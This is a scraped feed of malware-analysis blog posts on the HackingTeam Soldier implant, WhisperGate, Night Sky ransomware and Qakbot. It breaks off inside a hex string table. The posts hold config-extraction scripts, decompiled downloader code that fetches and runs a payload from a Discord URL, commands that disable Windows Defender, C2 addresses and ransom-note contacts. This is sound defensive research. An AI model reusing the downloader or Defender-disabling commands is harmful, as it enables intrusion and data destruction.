            "content": "Overview . HackingTeam Soldier Implant (packed): 76840fa18df8764afb51f1aa6da10ff65f1bdfe434dc988917380fa31fbe3a73 . All samples on available on Malshare. . References: . Packed Sample on Malshare | Hacking Team Source Code Leak | Noah Labs Blog (360) Hacking Team Solider Implant Analysis | . Unpacking VMP . Run wihtout debugger and pause with ProcessHacker | Attach with x64dbg and search .text for MSVC securty cookie constant | Based on security cookie constant location determine __security_init_cookie function location | Add hardware bp on __security_init_cookie function and relaunch process with debugger | Use call stack to determine what called __security_init_cookie function this is OEP | Remove hardware bp from __security_init_cookie and add hardware bp on OEP | Relaunch program so we break on OEP | Use VMPImportFixer to dump process | Fix OEP statically (PEBear) | . TODO: When we dump with VMPImportFixer there are some imports that are not protected in the binary. These are not captured by VMPImportFixer which means some of our imports are not resolved in the dump! We could maybe fix this by either patching VMPImportFixer to also add unprotected imports ... or we could update VMPFix to add both protected imports and normal imports to the new IAT then dump with Scylla instead of VMPImportFixer. . Config Extraction . The config is AES encrypted with CBC and a null IV | There is a seperate setup function that is used to load the key which is hard coded in the .data section | The config is stored in the .data section and is preceded by a DWORD with the length | . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . data_len = 0x240 data = unhex(&#39;238ba1f22cb105cdae82eb2dde4e2783c80370198e1bb02c231825e7b2d8c164109e5a4e09c63a36df5ed3c5ce49b825968d386eb9008ed2b6cae3b75cd8ba76d49ab1acf69d46a747934187883b2eb27aaab99dae892693dc714433ec2de2d238a036f5ff492414a6a4928f4bd907342e7fff0dd6e61f2a7675b351842a27bc1ba7d5ad7ebc44a11cfafd136f42644db89db7189c4d152a06b10f0c0a4b40c021d7192a04cd383b17434048768076c7d7eb073ef340c696aa35946aacbe99821352487082660334de43ca4e5e142d78f70dc7cb5b571463c3c3c7caf461eac5411136142b0051914f74859c44610f8e4fdcf4f6c269b03809e3aa67ebc3474ece444fe2f5078d36857c17147d834c6cb6ccd9effefca8b24ee01c0868fc1383ef26519c4f573f94b5bbb7b149dcc190f0a08fdc31965d69d97bbcf565e829182b8aa421f46a7e0100180d7ed9d31083b4b68431e0b888bbacb00864f140716359290eb37927ec0ea537b620e1108265f412a28c28c2df0cf1d713880cd874f79872dde1060d29cc7536684d49b504dcfc61c80a1210a5e69533bba05aad0a6dc7239ea90e29e822e0424f06524330a98f40e56c1149bad0350b6c79b1c03963e0cf43dce2f6f6e6412dee43ef937bff51bf345e57bc60c7df2ec4294cc2789547896a53dc43ab5fc15c6a377d0dbab97ff5e091f90fc28ad7acda94543b52bccea2c8f360e03a5fc01cab6d358804037ab20e17facc31293b437b7a22d8c32f835308fae01b83396667f18b47882e93b309ee31cc3e9c619a6a405db7e3bbcc&#39;) data = data[:data_len] key = unhex(&#39;60ab854458b00a742c6e8ceb7f1094da&#39;) def decrypt(data, key): from Crypto.Cipher import AES cipher = AES.new(key, AES.MODE_CBC, iv=b&#39; x00&#39;*16) return cipher.decrypt(data) # remember to split the rest of the string after the null decrypt(data, key) . b&#39;{&#34;camera&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0,&#34;iter&#34;:0},&#34;position&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;screenshot&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;photo&#34;:{&#34;enabled&#34;:false},&#34;file&#34;:{&#34;enabled&#34;:false},&#34;addressbook&#34;:{&#34;enabled&#34;:false},&#34;chat&#34;:{&#34;enabled&#34;:false},&#34;clipboard&#34;:{&#34;enabled&#34;:false},&#34;device&#34;:{&#34;enabled&#34;:true},&#34;call&#34;:{&#34;enabled&#34;:false},&#34;messages&#34;:{&#34;enabled&#34;:false},&#34;password&#34;:{&#34;enabled&#34;:false},&#34;keylog&#34;:{&#34;enabled&#34;:false},&#34;mouse&#34;:{&#34;enabled&#34;:false},&#34;url&#34;:{&#34;enabled&#34;:true},&#34;sync&#34;:{&#34;host&#34;:&#34;178.128.215.46&#34;,&#34;repeat&#34;:600},&#34;uninstall&#34;:{&#34;date&#34;:null,&#34;enabled&#34;:false}} x00&#34; x04&amp; xceB xa0 x82 xd4.U x81 x8d xdb x1ai] xae xbdZ x85 x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e&#39; . .text:012EF39B 3D EF BE AD DE cmp eax, 0DEADBEEFh .text:012EF3A0 75 09 jnz short loc_12EF3AB .text:012EF3A2 B8 01 00 00 00 mov eax, 1 .text:012EF3A7 8B E5 mov esp, ebp .text:012EF3A9 5D pop ebp .text:012EF3AA C3 retn .text:012EF3AB 56 push esi .text:012EF3AC 68 58 B5 38 01 push offset config_key .text:012EF3B1 50 push eax .text:012EF3B2 68 57 02 38 01 push offset asc_1380257 ; &quot;#&quot; .text:012EF3B7 E8 84 14 00 00 call mw_aes_decrypt . import pefile import re import struct pe_data = open(&#39;/tmp/work/ht.exe.fixed&#39;, &#39;rb&#39;).read() pe = pefile.PE(data = pe_data) target_code = pe_data.split(b&#39; xEF xBE xAD xDE&#39;)[1] egg = b&#39; x68(....). x68(....) xe8&#39; m = re.search(egg, target_code) if not m: print(&quot;All hope is lost!&quot;) config_va = struct.unpack(&#39;&lt;I&#39;, m.group(2))[0] key_va_bytes = m.group(1) config_offset = pe.get_offset_from_rva(config_va - pe.OPTIONAL_HEADER.ImageBase) config_len = struct.unpack(&#39;&lt;I&#39;, pe_data[config_offset -4:config_offset])[0] config_data = pe_data[config_offset:config_offset+config_len] tohex(config_data) . b&#39;238ba1f22cb105cdae82eb2dde4e2783c80370198e1bb02c231825e7b2d8c164109e5a4e09c63a36df5ed3c5ce49b825968d386eb9008ed2b6cae3b75cd8ba76d49ab1acf69d46a747934187883b2eb27aaab99dae892693dc714433ec2de2d238a036f5ff492414a6a4928f4bd907342e7fff0dd6e61f2a7675b351842a27bc1ba7d5ad7ebc44a11cfafd136f42644db89db7189c4d152a06b10f0c0a4b40c021d7192a04cd383b17434048768076c7d7eb073ef340c696aa35946aacbe99821352487082660334de43ca4e5e142d78f70dc7cb5b571463c3c3c7caf461eac5411136142b0051914f74859c44610f8e4fdcf4f6c269b03809e3aa67ebc3474ece444fe2f5078d36857c17147d834c6cb6ccd9effefca8b24ee01c0868fc1383ef26519c4f573f94b5bbb7b149dcc190f0a08fdc31965d69d97bbcf565e829182b8aa421f46a7e0100180d7ed9d31083b4b68431e0b888bbacb00864f140716359290eb37927ec0ea537b620e1108265f412a28c28c2df0cf1d713880cd874f79872dde1060d29cc7536684d49b504dcfc61c80a1210a5e69533bba05aad0a6dc7239ea90e29e822e0424f06524330a98f40e56c1149bad0350b6c79b1c03963e0cf43dce2f6f6e6412dee43ef937bff51bf345e57bc60c7df2ec4294cc2789547896a53dc43ab5fc15c6a377d0dbab97ff5e091f90fc28ad7acda94543b52bccea2c8f360e03a5fc01cab6d358804037ab20e17facc31293b437b7a22d8c32f835308fae01b83396667f18b47882e93b309ee31cc3e9c619a6a405db7e3bbcc&#39; . .text:013031B6 0F 10 05 7A 01 38 01 movups xmm0, xmmword_138017A .text:013031BD 0F 11 05 58 B5 38 01 movups config_key, xmm0 . key_egg = b&#39; x0F x10 x05(....) x0F x11 x05&#39; + key_va_bytes m = re.search(key_egg, pe_data) if not m: print(&quot;All hope is lost!&quot;) key_data_va = struct.unpack(&#39;&lt;I&#39;, m.group(1))[0] key_data_offset = pe.get_offset_from_rva(key_data_va - pe.OPTIONAL_HEADER.ImageBase) key_data = pe_data[key_data_offset:key_data_offset+16] tohex(key_data) . b&#39;60ab854458b00a742c6e8ceb7f1094da&#39; . decrypt(config_data, key_data) . b&#39;{&#34;camera&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0,&#34;iter&#34;:0},&#34;position&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;screenshot&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;photo&#34;:{&#34;enabled&#34;:false},&#34;file&#34;:{&#34;enabled&#34;:false},&#34;addressbook&#34;:{&#34;enabled&#34;:false},&#34;chat&#34;:{&#34;enabled&#34;:false},&#34;clipboard&#34;:{&#34;enabled&#34;:false},&#34;device&#34;:{&#34;enabled&#34;:true},&#34;call&#34;:{&#34;enabled&#34;:false},&#34;messages&#34;:{&#34;enabled&#34;:false},&#34;password&#34;:{&#34;enabled&#34;:false},&#34;keylog&#34;:{&#34;enabled&#34;:false},&#34;mouse&#34;:{&#34;enabled&#34;:false},&#34;url&#34;:{&#34;enabled&#34;:true},&#34;sync&#34;:{&#34;host&#34;:&#34;178.128.215.46&#34;,&#34;repeat&#34;:600},&#34;uninstall&#34;:{&#34;date&#34;:null,&#34;enabled&#34;:false}} x00&#34; x04&amp; xceB xa0 x82 xd4.U x81 x8d xdb x1ai] xae xbdZ x85 x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e&#39; .",
            "url": "https://research.openanalysis.net/vmprotect/malware/unpacking/soldier/hackingteam/2022/01/27/hackingteam_soldier.html",
            "relUrl": "/vmprotect/malware/unpacking/soldier/hackingteam/2022/01/27/hackingteam_soldier.html",
            "date": " ‚Ä¢ Jan 27, 2022"
        }
        
    
  
    
        ,"post65": {
            "title": "WhisperGate Malware",
            "content": "Overview . Stage 1 - MBR Wiper: a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92 . Stage 2 - Downloader: dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78 . Stage 3 - File Corruptor (injector): 9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d . Stage 4 - Final (unpacked on stream): 34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907 . All samples on available on Malshare. . References: . Elastic Security Research - Operation Bleeding Bear | S2W TALON - Analysis of Destructive Malware (WhisperGate) targeting Ukraine | Stage 1 - Analysis From Hexorcist (YouTube) | . Stage 2 - Downloader . This is a .NET binary that is obfuscated with NetReactor. We can use NetReactorSlayer to remove the obfuscation. Just drag the binary over and yes to all options. . TODO: Find a way to identify NetReactor obfuscation -- is there a signature for it? List of .NET de-obfuscation tools . Functionality . Download Stage3 binary from Discord | Binary is downloaded as Tbopbh.jpg and is reversed | Reverse binary and load it directly as a .NET assembly | Call Ylfwdwgmpilzyaph method from loaded Stage3 .NET assembly | . Sample Functions . private static byte[] ChangeFacade() { Facade.ReflectFacade(); try { ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; } catch { } byte[] array = (byte[])typeof(WebClient).GetMethod(&quot;DxownxloxadDxatxxax&quot;.Replace(&quot;x&quot;, &quot;&quot;), new Type[] { typeof(string) }).Invoke(new WebClient(), new object[] { &quot;https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg&quot; }); if (array.Length &gt; 1) { Array.Reverse(array, 0, array.Length); } return array; } private static void FillFacade(MethodInfo[] spec) { foreach (MethodInfo methodInfo in spec) { if (methodInfo.Name == &quot;Ylfwdwgmpilzyaph&quot;) { methodInfo.Invoke(null, null); } } } . Stage 3 - File Corruptor (Injector) . This is a .NET binary that appears to be obfuscated with Eazfuscator and we know from Stage2 that it is loaded as a .NET assembly and the method Ylfwdwgmpilzyaph is where the code starts. Because it is loaded as an assembly it doesn&#39;t have an entrypoint and cannot be launched directly like a regular PE file. . For Eazfuscator we can try some tools like de4dot and EazFizer but they all fail because Eazfuscator has actually virtualized the functions. We need to do this dynamically. . Analysis and Unpacking . Open module in dnspy | Right click assembly Edit Module... | Change Module Type to Windows and add Ylfwdwgmpilzyaph as the Managed Entry Point. | File -&gt; Save Module | Open saved module in dnspy | Locate call to EazFusactor vm in entrypoint u0005 u2005 u2000. u000E u2005 u2000(). u0002( u0005 u2005 u2000. u000F u2005 u2000(), &quot;#6k@H!uq=A&quot;, null); . | Press ctrl+f to open find and search for .invoke | When you find the function with the two invokes on the entrypoint &quot;call&quot; put a breakpoint on them.return u0002.Invoke( u0003, u0005); return ((ConstructorInfo) u0002).Invoke(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic, null, u0005, null) . | Start debugger | . The concept behind this method is that Eazfuscator uses the invoke each time it calls into a virtualized function. By putting a breakpoint here we can monitor and intercept the arguments for each call. Each time we break we can inspect the arguments then run until we break again at the next call. . Functionality . The sample checks if it is running as admin, if it isn&#39;t it will launch itself again elevated and teminate. | The sample drops a VBS script %TEMP% Nmddfrqqrbyjeygggda.vbs that attempts to exclude C: from Windows Defender CreateObject(&quot;&quot;WScript.Shell&quot;&quot;).Run &quot;&quot;powershell Set-MpPreference -ExclusionPath &#39;C: &#39;&quot;&quot;, 0, False . | Drops AdvancedRun.exe in %TEMP% (SHA256: 29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b) | Attempts to stop Windows Defender /EXEFilename C: Windows System32 sc.exe /WindowState 0 /CommandLine &quot;&quot;stop WinDefend&quot;&quot; /StartDirectory &quot;&quot;&quot;&quot; /RunAs 8 /Run /EXEFilename C: Windows System32 WindowsPowerShell v1.0 powershell.exe /WindowState 0 /CommandLine &quot;&quot;rmdir &#39;C: ProgramData Microsoft Windows Defender&#39; -Recurse&quot;&quot; /StartDirectory &quot;&quot;&quot;&quot; /RunAs 8 /Run . | Copy InstallUtil.exe into %TEMP% and launch it | Unpack Stage4 which is reversed and gzipped | Inject Stage4 into InstallUtil.exe | . Helpful Eazfuscator Concepts . Create EXE From Assembly (Add Entrypoint) . . Add Function Call Breakpoint To EazFusactor . . Stage 4 - File Corruptor (Final) . This is a 32bit native Windows binary that has been compiled with MinGW. . Functionality . Use GetLogicalDrives and interate through drives selecting FIXED and REMOTE drives | Recursively iterate through files in all directories except for %HOMEDRIVE% Windows | Compare the file extension against a list of target file extensions | For matching files replace the file contents with 0x100000 byes of xcc | Append a random hex integer to the corrupted file name | . File Extension target list . cmd .HTML .HTM .SHTML .XHTML .PHTML .PHP .JSP .ASP .PHPS .PHP5 .ASPX .PHP4 .PHP6 .PHP7 .PHP3 .DOC .DOCX .XLS .XLSX .PPT .PPTX .PST .OST .MSG .EML .VSD .VSDX .TXT .CSV .RTF .WKS .WK1 .PDF .DWG .ONETOC2 .SNT .JPEG .JPG .DOCB .DOCM .DOT .DOTM .DOTX .XLSM .XLSB .XLW .XLT .XLM .XLC .XLTX .XLTM .PPTM .POT .PPS .PPSM .PPSX .PPAM .POTX .POTM .EDB .HWP .602 .SXI .STI .SLDX .SLDM .BMP .PNG .GIF .RAW .CGM .SLN .TIF .TIFF .NEF .PSD .AI .SVG .DJVU.SH .CLASS .JAR .BRD .SCH .DCH .DIP .PL .VB .VBS .PS1 .BAT .CMD .JS .ASM .H .PAS .CPP .C .CS .SUO .ASC .LAY6 .LAY .MML .SXM .OTG .ODG .UOP .STD .SXD .OTP .ODP .WB2 .SLK .DIF .STC .SXC .OTS .ODS .3DM .MAX .3DS .UOT .STW .SXW .OTT .ODT .PEM .P12 .CSR .CRT .KEY .PFX .DER .OGG .RB .GO .JAVA .INC .WAR .PY .KDBX .INI .YML .PPK .LOG .VDI .VMDK .VHD .HDD .NVRAM .VMSD .VMSN .VMSS .VMTM .VMX .VMXF .VSWP .VMTX .VMEM .MDF .IBD .MYI .MYD .FRM .SAV .ODB .DBF .DB .MDB .ACCDB .SQL .SQLITEDB .SQLITE3 .LDF .SQ3 .ARC .PAQ .BZ2 .TBK .BAK .TAR .TGZ .GZ .7Z .RAR .ZIP .BACKUP .ISO .VCD .BZ .CONFIG .",
            "url": "https://research.openanalysis.net/whispergate/malware/2022/01/20/whisper_gate.html",
            "relUrl": "/whispergate/malware/2022/01/20/whisper_gate.html",
            "date": " ‚Ä¢ Jan 20, 2022"
        }
        
    
  
    
        ,"post66": {
            "title": "Night Sky Ransomware",
            "content": "Overview . Sample (packed): 8c1a72991fb04dc3a8cf89605fb85150ef0e742472a0c58b8fa942a1f04877b0 . Sample (dumped/unpacked): 1fca1cd04992e0fcaa714d9dfa97323d81d7e3d43a024ec37d1c7a2767a17577 . References: . First seen from MalwareHunterTream | Sample VT | Sample Malshare | Malware Bazaar | id-ransomware | . Dynamic Analysis . Drops hta ransom note in every directory (NightSkyReadMe.hta) | Uses .nightsky file extension for encrypted files | . Unpacking . The sample is packed with some version of VMProtect, likely a newer version (3?) but I&#39;m unsure. It seems to have some anti-debug that actually works against ScyllaHide but luckily it will run with a debugger attached. MrExodia confirmed that the entrypoint was virutalized but we discovered that the main funcationlity was not. This allowed us to break in the main functionality and use vmpdump to dump the payload and resolve the imports. . Static Analysis . The code is strightforward but it contains a statically linked mbedtls library. To assist with reverse engineering we used lumina to pull down some function names for the mbedtls functions, and we compiled version 3.0.0 of mbedtls and imported the .pdb file to give us access to the library structs in IDA. . OSINT . It seems as though this might be a updated version of Rook Ransomware (January 8, 2022). Many researchers are spreading something what is not true.. Please repair your analytical conclusions.#Rook #ransomware is basically previous version of new #NightSky - delivered VMProtected (will be shared later).Facts about #Rook in pictures!!!@malwrhunterteam@cPeterr pic.twitter.com/63bTaWDDmp . &mdash; Ji≈ô√≠ Vinopal (@vinopaljiri) January 9, 2022 &gt; Many researchers are spreading something what is not true.. Please repair your analytical conclusions. #Rook #ransomware is basically previous version of new #NightSky - delivered VMProtected (will be shared later). Facts about #Rook in pictures!!! . . . . Dynamically Extracted IOCs . RSA Public Keys . --BEGIN PUBLIC KEY-- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwetDt+9kp5JJGCb3YrqH 48g0rxFIaj5/NjMBvxtpa+7nO/lS0FQXxWJO78dTT6xW/UgVLPK4MvbGeIj17aQF SqGHbRxTeoPrHufp4sM4J2IQYLc6YLYZMS6XT02rHOjumBJpEKyROQ+df5KU/06o Rrhljc0Qco+qW8q/xYJQ9VFa87IJM6WM3wsydHVDDeGuWi4/PMUT4/GAa8/WMUYW 9Ebw7/hXd/aNX5LykeonN+nkJfbj1fZNTU81tc8Kx4rykLvMVE1H3AaT5ssCBt7p AFkLLjplOXz3XmhH+J5vm5Ifi7T85j4D6O03qocO2gwezIikCDU2YAOOpJzkb5Ab +wIDAQAB --END PUBLIC KEY-- . --BEGIN PUBLIC KEY-- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnw/AqzVYc7H6A34K3MQ6 J8nJeaCSegiSOIjhxveQeocKp6TzvL6W3usuMbJKGfL9b19KkiYYyK0WAJ/gsIpq DH7xLCeOq8Lttp07PJmpyOLzzSyuSRKY3E7uSATXMzvJq4OuIkAcwWdce8OnQfS0 17VxNISQU6XQMjt81sqHTzvmg3DaeoqGb1oISWyDoRMFd5Akt04Iw//aNIoGIBvh e/HP71LQpbyzb0RY0HBQuk3zlIDK6J5Hvr+Bkd4Tr5oh/oBya6RX7gW5t1FkY42c /maunB4PiPgHiPdHtJ1LQE+EtSLWU4ZCc0finaLBh3ooySIcsLP9ehlWds1h1ZWN 2QIDAQAB --END PUBLIC KEY-- . TODO: Why are there two RSA keys? . Ransom Note IOCs . Contact information Web Chat: You can use the username and password provided by us to login to the chat room to communicate with us. URL:https://contact.nightsky.cyou username:user-kdwckin password:kdjfikerjijJHDUFIGjk3289 Email: You can contact us by email. EMAIL ADDRESS:akij@nightsky.cyou -- Data release website Where we use to disclose the data of customers who do not pay http://gg5ryfgogainisskdvh4y373ap3b2mxafcibeh2lvq5x7fx76ygcosad.onion -- Remark How to access dark web sites:https://www.youtube.com/watch?v=NpXEQHDOA5o . Mutex . The mutex tset123155465463213 is used to prevent multiple cuncurrent versions of the ransomware. This might be a nice vaccine? . Encryption . TODO .",
            "url": "https://research.openanalysis.net/vmprotect/night%20sky/ransomware/malware/2022/01/06/nightsky_ransomware.html",
            "relUrl": "/vmprotect/night%20sky/ransomware/malware/2022/01/06/nightsky_ransomware.html",
            "date": " ‚Ä¢ Jan 6, 2022"
        }
        
    
  
    
        ,"post67": {
            "title": "Qakbot / Qbot",
            "content": "Overview . Sample (unpacked): 670e990631c0b98ccdd7701c2136f0cb8863a308b07abd0d64480c8a2412bde4 . References: . Unpacked Sample - Malshare | Malware Bazaare | AGDC Config Extractor Tutorial | Malpedia Articles | UnpacMe | . Expected C2 Config . The following are c2 IPs that we expect to be in the config based on our sandbox output. . 32.221.229.7:443 140.82.49.12:443 24.152.219.253:995 182.56.99.126:443 76.169.147.192:32103 218.101.110.3:995 89.101.97.139:443 82.152.39.39:443 176.24.150.197:443 96.37.113.36:993 68.186.192.69:443 59.88.168.108:443 75.110.250.187:443 182.191.92.203:995 89.165.88.95:443 103.142.10.177:443 45.9.20.200:2211 24.95.61.62:443 194.36.28.26:443 78.101.82.198:2222 37.211.157.100:61202 70.163.1.219:443 31.215.99.73:443 103.143.8.71:6881 59.6.7.83:61200 63.153.187.104:443 14.96.79.22:61202 93.48.80.198:995 24.53.49.240:443 94.200.181.154:995 149.135.101.20:443 24.178.196.158:2222 209.210.95.228:32100 78.101.82.198:443 67.209.195.198:443 96.80.109.57:995 80.14.196.176:2222 38.70.253.226:2222 24.222.20.254:443 217.165.123.47:61200 74.15.2.252:2222 217.128.93.27:2222 102.65.38.67:443 190.73.3.148:2222 79.167.192.206:995 95.5.133.68:995 114.79.148.170:443 120.150.218.241:995 186.64.87.213:443 65.100.174.110:443 96.21.251.127:2222 136.232.34.70:443 63.143.92.99:995 136.143.11.232:443 39.49.27.10:995 111.125.245.116:995 41.228.22.180:443 217.164.247.241:2222 83.110.107.123:443 76.25.142.196:443 74.5.148.57:443 65.128.74.102:443 67.165.206.193:993 173.21.10.71:2222 71.74.12.34:443 94.60.254.81:443 23.233.146.92:443 73.151.236.31:443 79.160.207.214:443 213.120.26.24:443 89.137.52.44:443 75.188.35.168:443 109.12.111.14:443 106.51.48.170:50001 68.204.7.158:443 78.101.82.198:995 80.6.192.58:443 41.96.250.164:995 114.79.145.28:443 188.54.96.91:443 105.198.236.99:995 50.238.6.36:443 65.100.174.110:8443 70.51.134.181:2222 117.248.109.38:21 86.98.53.83:443 182.176.180.73:443 217.165.11.65:61200 103.143.8.71:995 50.237.134.22:995 187.189.86.168:443 100.1.119.41:443 2.178.67.97:61202 86.198.237.51:2222 88.253.171.236:995 73.171.4.177:443 40.134.247.125:995 72.252.201.34:995 190.39.205.165:443 187.172.146.123:443 92.167.4.71:2222 189.30.244.252:995 105.111.124.76:443 84.199.230.66:443 14.96.67.177:443 182.56.57.23:995 87.70.93.215:443 93.48.58.123:2222 73.5.119.219:443 75.169.58.229:32100 173.71.147.134:995 69.46.15.180:443 23.82.128.108:443 5.36.7.212:443 200.75.131.234:443 82.77.137.101:995 187.201.90.81:443 24.55.112.61:443 201.172.31.95:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:443 207.246.112.221:995 216.238.72.121:995 216.238.71.31:443 27.223.92.142:995 24.229.150.54:995 117.198.149.221:443 . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . String Tables . key = unhex(&#39;efb05bc91c9c83400d08dd5087959b8b72a7a75b36b8d290c42ddbc22d292414ed86a03f3672a15b8da8bae6c737a55506eb623c9735a5fb41f213f30e4816fc32d9c4ecf873b394b869545cc2f382562e46cad089290ba543bd0000a990b9399a24d735&#39;) data = unhex(&#39;8cdf29ac4ff9f136646bb803eff0f7e75cc2df3e0de8b1f38a7996ad4307416c88bdee6b6426f238ecc69483bf52a51844aa2f6ff247d39222973d96762d2d9150b8a98b8d1a9df1c00c5479918af1224b2b98bfe65d2ef910c49ce7149e2aa8df257578b13ff5f0e9a517dfc25b7bcb9fe08143bcec48514114bec9e66b6133f31ed1e5d385b558d63a609f3e71fe56d794329d75872e0978885bb4a5808f12c1f1e42c2c3fae86f13f4128b98cd9487fcd30bdb8f2119655dbcd0f5f4ddd3df7e7b5ef1ecba71759dbb3fc8842acc24f4d457388e8d411530ac460fbdbc983b5418b307e8e594ae446c0893782639f202d6e9932b8b29cd616cbf18302352ab681e32f0023b2b5896a31f90af3bbf509875dd0df1f526db020f3ec9be81fc3893e4eddd2c38b6b8f956c7b6148bae9d70902419315e2ccdfba8a5ec62769980d5ae369f2922f967c847d68529954bcaa889d01efc7c8103a39b6f3de0a001abab9f94c57a53898df8203ec2caedb653d3a8575b7a7c3a6579795031388e0c8e908ebf0750c1426b5ab850f042a846bbff097c3f705fd7036d93a19a707fdde71c04bd63e7a4ed902eb9c91f804d1fe960e3b5cec90e4312e16abb3e2486cc030bd86c033a56cfdf329236cb13c87fcf6ea15c2882b5cc8b7f7c40888bb5e5d4179bfe9cf4b132ef222fefff5b1f103f91a688e264efe43c0a824866683202d6e99328ead82cb41ecc4d6391132b69af62f2e33b9b5fb1a398b27d183b07e9a65eff725605ab23ff3b0c7d80bd4d33e5b8be0cca95ea9a3034c5c71edd1f26c775cc423e8a8cc84b437c62665990b4ce31bc08324f276947b2138994abcff899301ddbadd11315c84b2ce056b46e4b4e5450bd120cd8bc536b932f9fb25367fb43ee3e0f6fb5cc2df3e0ddda6f8a15fbea34107416c88bdd7564417d233ecdad1c8a24fc06e639f1659e556c48b6f976b96353a628f5cb0a28ad616cbf18319353fa996f6354f36bea5fb4c25c03bd8d4d33ab968e9f125636da97ee2edfe8b11d5de2b428be0bea041b7c26c656841bec3f26c6620ee1dc4e4ffe6b45fc922679b0b12f359c9fb329767867e2966951cbda880f805d8fdcb0c7a39ba96b93f5d23b9a2ff076edd26868cdd3fa87bf9ed34236da53587a4a9b84692916c0e81e290a55bbca15e5b526cc3e3d85a0d13d73cfeded99ee952dd303d8a145bf446d78d20dc768b6b48798c57b7c498c556c0b4cc003939ffa8a7661c22f0f5b91b6f9f668dddd476ec2caee76f2838ef34a8b0ffd672f4d2395bd1a6c3a540abae485a677b83f5c5514272f632e3dbce87f737e627638a16599710f6823286769e5c277988178597958b24fcc38e5d0839ba83ee395c23b8feec516ea566eec1956bff789ca96f2708b033f4fdf2ee1ec3893e4eddd2f1b45db7ab4e48507d82e88f471b01c934eec3cd87b15288336a8a11549766eabd15a552a14b14419345eff0dfca3ddcf0dd351935a181ed254120bef0c8477fcc0edc83c73abb79c0d0307446b82487e2e8b92d94957552d4be90e17ea2b1594c494682e9d41a6a21d828dae7edd0f36bdd226f91034ef31bc08324f261966966738457f985a8bc5391dcf3251900e780a0760120eafffd092ed66392999079ec6fbea36f6928ff75f4b79bf81cdfcf3069dabde2a048a99d4050537a8986f35a4252ce39e7fff7af9452d7236f88071caa15e29e35bd71996b2b62d410aead829514dee0cb53767ce4d3a02d472bbab5fb5a64cb22c986df358579eae62c3061b020e2e7e8e41cc6d33e4b998eccea71fea1424650488eefcd4904508851decdcec6a855cf0574840159e44685c661b57687412a7c9951adecce8f1addf9df04202ff881ed395a1aa9b9e45f399f14d4818369964ceeec23687bae72ae9ffef900f5c22f43cabcb0f90db4a04779567b8ee3d34c1831d33eecdcdfcee512d6772acb0c49fb5989db2f877fdf2e2663901bd9b39c9b12c3badc05385cb196ee334d32ead0de40659671e2acdf36b969e8e6325e71ae24e2f89bd80bd4f014618ee690a240b4ac034c5c71edc7d65e4506f22dee86df9ea237ce3074850750a4078b9f2d9e13d65d31658857b49683970796c8eb102728a79eb164722ba5b2fa5065c66dd897d55ba779e8e230643bef7ee3f9f78b31c8c92f53d6a6bd9054aba7170945649deac95c5706c834e387c2cbb040d27860841051ba40d797249c709c6a2d72fc1789b6839f01d2f9fe003839b1dbfa6e186fef8cc0477fc031d38ac47b8c64ecef2f7f6daf0ceef0e3fb1ec8d53e18ddaaf5c44cbfb44c594d27dfa8c4535a72f214cbfceda79572f9186f881053e45ac38f1da57a9d6a27618f129da18a9d1dd7f1ca351124a19ff7254729a4a3d5796ad12bceefd36195409ca613747ba935eac7f4e40682fb3e4ec8beffb648a9ec485141148cf5d757591dca23a3ccd68ac712f62c759f0751c55aca8f64ae768b7e24798e57abea898016b3fccc1d242fc2a0ed305a31aba2ec7546cc20cf80c334af689ca6107f67ba22e6f8dde21ec2d47e6af1bce4a15fb5a75909616c9deacf4d5300fd32e8d0ca8aa845c07b6393073cc44cd68f249f20c10e2c61995cbead829d5dd6ecdd52302ba381e9324f23a7bfe7076edd26868bc72ca868ffeb257f26b828e295cce21c94950466d0abe3ad4ebaae604c497b9fffa04b4f02c466bdd09fd6f36fa57055921148f258f7942e8636af5d31658857b4f7dea40bc4fdc2082638ec96fa332e31bea3e859629671938bdc37c932f8e2340d69ae27effaf4e01389c3375ab89ef1b75999ad425d7164b9efcd5a3621e417c8ebeec6ed17e30749a6426bfe5b96c91ea2619c6d2d658f5dabc4a19709daf8d4087b69ecc3a27e792fa4b4e65e78850de9cf8675f827bcf136373fea7eb7bcbbcc17c4cc34198ae2a1f41deaf21c09627d9fe3c6504e5d966ca398bab1ae59966759bb1053f450d68841a57a9d3d7a49b85baaafa88a1ac5f1b8273531a7f3e4254629b9a4ec5b38976dd897d55b9a6ce5cd25795ab820e8e7efe21cc0a7080c909fdcff16959516121f58baafa068673ea138b7f4d28fa552d7336f874c4fee46d68841a15cb55a1f57ae778589859b01dce7d70f20008f9ae1244135a5b6fd094acb37d4a2d137be7deee61c5e78a41ee2e19bd817d3873454d285dd8d7ebeb05b404771cdbb80785306ee39e7cdd992ef15d23c68860551e3469fd961d433d175217b8c57abb7839612c7fdd7071839b496ee6b472bbab5fb5a64cb22c98acd7a9540b2df656e67b224dbf6f2e